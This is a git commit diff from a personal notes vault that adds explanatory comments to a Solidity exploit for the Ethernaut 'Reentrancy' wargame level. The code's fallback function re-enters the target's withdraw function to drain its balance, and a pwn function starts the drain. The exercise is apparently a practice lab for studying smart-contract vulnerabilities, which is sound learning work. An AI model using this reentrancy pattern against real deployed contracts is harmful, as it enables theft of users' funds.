284b4b7df962737d706ab5029530be7211217b77
Man715 <man715@protonmail.com>
2022-05-27 13:37:20 -0600

    vault backup: 2022-05-27 13:37:20

--- ethernaut/10-Reentrancy/Test.sol
+++ ethernaut/10-Reentrancy/Test.sol
@@ -6,21 +6,30 @@ contract Test {
   Reentrance target;
 
   constructor() public payable {
+    // Create the target contract.
     target = new Reentrance();
+
+    // Fund the contract. We could use transfer but there is already a built in way to move funds to the contract.
     target.donate.value(10 ether)(address(0x12345));
   }
 
+  // Donate to the target contract on behalf of this address
   function donate() public {
     target.donate.value(1 ether)(address(this));
   }
 
+  // Initiate a withdraw which will withdraw funds triggering the fallback function.
   function pwn() public {
     target.withdraw(1 ether);
   }
 
   fallback() external payable {
+    // Get the balance of the target contract (the one calling this one)
     uint steal = address(msg.sender).balance;
+    // Check if the balance is greater than one ether.
+    // If the balance is greater than one ether, set the steal value to 1 ether.
     steal = steal > 1 ether ? 1 ether : steal;
+    // If the balance is greater than one ether, attempt to withdraw it.
     if (steal != 0)
       address(msg.sender).call(abi.encodeWithSignature("withdraw(uint256)", steal));
   }
